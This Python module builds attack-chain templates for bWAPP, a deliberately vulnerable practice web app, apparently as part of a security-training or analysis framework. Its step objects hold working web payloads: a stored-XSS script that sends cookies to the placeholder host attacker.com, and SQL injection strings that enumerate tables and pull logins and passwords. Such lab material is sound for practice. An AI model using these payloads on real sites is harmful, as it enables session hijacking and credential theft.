#!/usr/bin/env python3
"""
bWAPP (Buggy Web Application) - Attack Chain Templates
Author: Victor Ibhafidon

Pre-built attack chain templates for bWAPP.
bWAPP contains 100+ vulnerabilities for comprehensive testing practice.

HOW IT CONNECTS TO THE FRAMEWORK:
- Uses chain_analyzer.py to create AttackChain objects
- Templates for bWAPP's extensive vulnerability set
- Integrates with visualizer.py for diagram generation

USAGE:
 from chains.chain_templates.bwapp_templates import get_bwapp_templates
 
 templates = get_bwapp_templates()
"""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from chain_analyzer import (
 ChainAnalyzer, ChainStep, VulnerabilityType, ImpactLevel
)

def create_xss_to_session_hijacking_chain():
 """
 Template: XSS to Session Hijacking
 
 Stored XSS leads to session token theft and account takeover.
 """
 analyzer = ChainAnalyzer()
 
 chain = analyzer.create_chain(
 title="bWAPP - XSS to Session Hijacking",
 description="Stored XSS vulnerability leads to session hijacking and account takeover",
 impact=ImpactLevel.HIGH
 )
 
 chain.prerequisites = [
 "Access to bWAPP",
 "Ability to post user-generated content"
 ]
 chain.context = "bWAPP XSS vulnerability"
 chain.tags = {"xss", "session-hijacking", "bwapp", "web"}
 chain.severity = "High"
 
 # Step 1: Stored XSS
 step1 = ChainStep(
 step_number=1,
 vulnerability_type=VulnerabilityType.XSS,
 description="Inject XSS payload in user input field",
 endpoint="/xss/stored/",
 payload="<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
 outcome="XSS payload stored"
 )
 
 # Step 2: Session Theft
 step2 = ChainStep(
 step_number=2,
 vulnerability_type=VulnerabilityType.SESSION_HIJACKING,
 description="XSS executes when victim views page, stealing session cookie",
 endpoint="Victim's browser",
 prerequisites=["XSS payload stored"],
 outcome="Session cookie stolen"
 )
 
 # Step 3: Account Takeover
 step3 = ChainStep(
 step_number=3,
 vulnerability_type=VulnerabilityType.SESSION_HIJACKING,
 description="Use stolen session cookie to access victim's account",
 endpoint="/portal/",
 prerequisites=["Session cookie stolen"],
 payload="Cookie: PHPSESSID=<stolen_cookie>",
 outcome="Account takeover achieved"
 )
 
 chain.add_step(step1)
 chain.add_step(step2)
 chain.add_step(step3)
 
 return analyzer, chain

def create_sql_injection_to_data_exfiltration_chain():
 """
 Template: SQL Injection to Data Exfiltration
 
 SQL injection leads to database access and sensitive data exfiltration.
 """
 analyzer = ChainAnalyzer()
 
 chain = analyzer.create_chain(
 title="bWAPP - SQL Injection to Data Exfiltration",
 description="SQL injection vulnerability allows database access and data exfiltration",
 impact=ImpactLevel.HIGH
 )
 
 chain.prerequisites = [
 "Access to bWAPP SQL Injection module"
 ]
 chain.context = "bWAPP SQL Injection vulnerability"
 chain.tags = {"sql-injection", "data-exfiltration", "bwapp", "database"}
 chain.severity = "High"
 
 # Step 1: SQL Injection Discovery
 step1 = ChainStep(
 step_number=1,
 vulnerability_type=VulnerabilityType.SQL_INJECTION,
 description="SQL injection in movie search field",
 endpoint="/sqli/",
 payload="' OR '1'='1'--",
 outcome="SQL injection confirmed"
 )
 
 # Step 2: Database Enumeration
 step2 = ChainStep(
 step_number=2,
 vulnerability_type=VulnerabilityType.SQL_INJECTION,
 description="Enumerate database structure",
 endpoint="/sqli/",
 prerequisites=["SQL injection confirmed"],
 payload="' UNION SELECT table_name FROM information_schema.tables--",
 outcome="Database structure enumerated"
 )
 
 # Step 3: Data Exfiltration
 step3 = ChainStep(
 step_number=3,
 vulnerability_type=VulnerabilityType.SQL_INJECTION,
 description="Extract sensitive user data",
 endpoint="/sqli/",
 prerequisites=["Database structure enumerated"],
 payload="' UNION SELECT login, password FROM users--",
 outcome="Sensitive data exfiltrated"
 )
 
 chain.add_step(step1)
 chain.add_step(step2)
 chain.add_step(step3)
 
 return analyzer, chain

def get_bwapp_templates():
 """Get all bWAPP attack chain templates."""
 templates = []
 
 analyzer1, chain1 = create_xss_to_session_hijacking_chain()
 templates.append((analyzer1, chain1))
 
 analyzer2, chain2 = create_sql_injection_to_data_exfiltration_chain()
 templates.append((analyzer2, chain2))
 
 return templates

if __name__ == "__main__":
 print("=" * 80)
 print("bWAPP - ATTACK CHAIN TEMPLATES")
 print("=" * 80)
 
 templates = get_bwapp_templates()
 for analyzer, chain in templates:
 print(f"\n {chain.title}")
 print(f" Steps: {len(chain.steps)}")
 is_valid, _ = chain.validate_chain()
 print(f" Status: {' Valid' if is_valid else ' Issues'}")
 
 print(f"\n Total: {len(templates)} templates")

